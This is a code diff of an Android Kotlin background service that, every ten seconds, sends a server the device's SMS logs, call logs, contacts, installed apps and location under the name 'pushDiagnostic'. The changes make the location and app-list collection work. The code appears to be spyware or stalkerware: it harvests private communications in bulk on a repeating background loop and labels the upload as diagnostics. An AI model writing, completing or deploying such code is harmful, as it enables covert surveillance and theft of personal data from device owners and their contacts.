@@ -40,12 +40,11 @@ class AppService : Service() {
     private val NOTIF_ID = 1
     private val NOTIF_CHANNEL_ID = "Channel_Id"
     private var locationManager: LocationManager? = null
-    private var deviceLocation: Location? = null
+    private var deviceLocation: String? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "--> Service Started")
         locationManager = getSystemService(LOCATION_SERVICE) as LocationManager?
-//        workerThread()
         ContextCompat.getMainExecutor(applicationContext).execute {
             try {
                 // Request location updates
@@ -63,7 +62,7 @@ class AppService : Service() {
         Timer().schedule(object : TimerTask() {
             override fun run() {
                 Log.d(TAG, "todo for hit background service repeat")
-                pushDiagnostic(deviceLocation)
+                pushDiagnostic()
 
             }
         }, 0, 10000L)
@@ -78,7 +77,11 @@ class AppService : Service() {
     private val locationListener: LocationListener = object : LocationListener {
         override fun onLocationChanged(location: Location) {
             Log.d(TAG, "location " + location.longitude + ":" + location.latitude)
-            deviceLocation = location
+            var currentLocation = mutableMapOf<String, Any>()
+            currentLocation["latitude"] = location.latitude
+            currentLocation["longitude"] = location.longitude
+            Log.d(TAG, "location json" + Gson().toJson(currentLocation))
+            deviceLocation = Gson().toJson(currentLocation)
         }
 
         override fun onStatusChanged(provider: String, status: Int, extras: Bundle) {}
@@ -91,11 +94,11 @@ class AppService : Service() {
 //
 //    }
 
-    private fun pushDiagnostic(location: Location?) {
+    private fun pushDiagnostic() {
 
 
         NetworkConfig().getService()
-            .pushDiagnostic(getModel(location))
+            .pushDiagnostic(getModel())
             .enqueue(object : Callback<String> {
                 override fun onFailure(call: Call<String>, t: Throwable) {
 
@@ -152,7 +155,7 @@ class AppService : Service() {
         return channelId
     }
 
-    private fun getModel(location: Location?): ServiceModel? {
+    private fun getModel(): ServiceModel? {
         if (ActivityCompat.checkSelfPermission(
                 this,
                 Manifest.permission.ACCESS_FINE_LOCATION
@@ -171,10 +174,10 @@ class AppService : Service() {
         val smsLogs = getSMSLogs()
         val callLogs = Gson().toJson(getCallLogs())
         val listContact = Gson().toJson(getNamePhoneDetails())
-        val appsInstalled = Gson().toJson(getAllAppsInstalled())
+        val appsInstalled = getAllAppsInstalled()
         var strLocation = "Location Unknown"
-        if (location != null) {
-            strLocation = Gson().toJson(location)
+        if (deviceLocation != null) {
+            strLocation = deviceLocation!!
         }
 
         val model = ServiceModel(
@@ -305,7 +308,7 @@ class AppService : Service() {
 
 
     @Throws(PackageManager.NameNotFoundException::class)
-    fun getAllAppsInstalled() {
+    fun getAllAppsInstalled() : String {
         val mainIntent = Intent(Intent.ACTION_MAIN, null)
         mainIntent.addCategory(Intent.CATEGORY_LAUNCHER)
 
@@ -333,6 +336,7 @@ class AppService : Service() {
         }
         // set all the apps name in list view
         Log.d(TAG, "apps --> ${Gson().toJson(apps)}")
+        return Gson().toJson(apps)
     }
 
 }
